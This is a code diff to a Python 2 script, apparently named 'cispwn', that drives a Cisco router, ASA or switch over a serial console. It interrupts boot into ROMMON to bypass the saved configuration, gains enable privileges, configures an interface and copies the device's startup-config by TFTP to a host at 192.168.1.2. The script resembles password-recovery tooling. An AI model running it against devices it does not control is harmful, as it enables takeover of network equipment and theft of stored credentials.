@@ -24,6 +24,10 @@ password_list = []
 #Upon power cycling, loops the command until the router boots with a blank config. It then enables higher priviledges for further commands to be run.
 def rommon(console):
 	select = False
+	rom = False
+	global router
+	global asa
+	global switch
 	print "Attempting to identify device type"
 	while select == False:
 		prompt = read_serial(console)
@@ -34,9 +38,13 @@ def rommon(console):
 			asa = 0
 			select = True
 			print "Router selected"
-		elif 'Use break or ESC to interrupt boot' in prompt or 'Launching BootLoader' in prompt or "seconds" or "rommon" in prompt:
-			if "rommon" in prompt:
-				rom = True
+		elif 'rommon' in prompt:
+			asa = 1
+			switch = 0
+			router = 0
+			select = True
+			print "ASA Selected"
+		elif 'Use break or ESC to interrupt boot' in prompt or 'Launching BootLoader' in prompt or "seconds" in prompt:
 			asa = 1
 			switch = 0
 			router = 0
@@ -51,7 +59,6 @@ def rommon(console):
 		else:
 			print "Error, a type could not be identified. This script will wait for 5 seconds and loop again."
 			time.sleep(5)
-	rom = False
 	while rom == False:
 		#Checks if the config has already been loaded
 		if router == 1:
@@ -100,7 +107,9 @@ def rommon(console):
 				time.sleep(10)
 				send_command(console, cmd = 'boot')
 				print "Booting"
-				time.sleep(30)
+				time.sleep(40)
+				send_command(console, cmd = 'no')
+				send_command(console, cmd = '')
 				send_command(console, cmd = 'enable')
 				send_command(console, cmd = '')
 '''
@@ -114,6 +123,10 @@ def rommon(console):
 
 #sets IP settings of the router's interface
 def tftp_setup(console):
+	global router
+	global asa
+	global switch
+	global tftp
 	if router == 1:
 		send_command(console, cmd = 'config t')
 		send_command(console, cmd = 'do show ip int brief')
@@ -138,10 +151,15 @@ def tftp_setup(console):
 		print "Setting interface options"
 		send_command(console, cmd = 'int vlan 1')
 		send_command(console, cmd = 'ip addr 192.168.1.1 255.255.255.0')
+		send_command(console, cmd = 'no shut')
+		send_command(console, cmd = 'security-level 0')
+		send_command(console, cmd = 'nameif inside')
 		send_command(console, cmd = 'int Eth 0/0')
+		send_command(console, cmd = 'switchport mode access')
 		send_command(console, cmd = 'switchport access vlan 1')
 		send_command(console, cmd = 'no shut')
-		send_command(console, cmd = '\x03')
+		send_command(console, cmd = 'exit')
+		send_command(console, cmd = 'exit')
 		send_command(console, cmd = '')
 		print "Interface options set"
 		tftp = 1
@@ -166,8 +184,14 @@ def tftp_setup(console):
 
 def copy_config(console):
 	#tftp the config file to the host machine for further commands
+	global tftp
+	print tftp
 	if tftp == 0:
+		print 'pls work'
+		print asa
 		tftp_setup(console)
+		send_command(console, cmd = 'copy run start')
+		send_command(console, cmd = '')
 	send_command(console, cmd = 'copy startup-config tftp:')
 	send_command(console, cmd = '192.168.1.2')
 	send_command(console, cmd = 'cispwn-config.txt')
@@ -284,6 +308,7 @@ def send_command(console,cmd = ''):
 	#Sends a command to the router and returns the bytes in waiting as output.
 	console.write(cmd+'\n')
 	time.sleep(3)
+	print read_serial(console)
 
 def main(argv):
 	try:
@@ -316,7 +341,7 @@ def main(argv):
 		sys.exit()
 	#Function for entering rommon goes here
 	rommon(console)
-	print read_serial(console)
+	copy_config(console)
 
 if __name__ == "__main__":
 	main(sys.argv[1:])
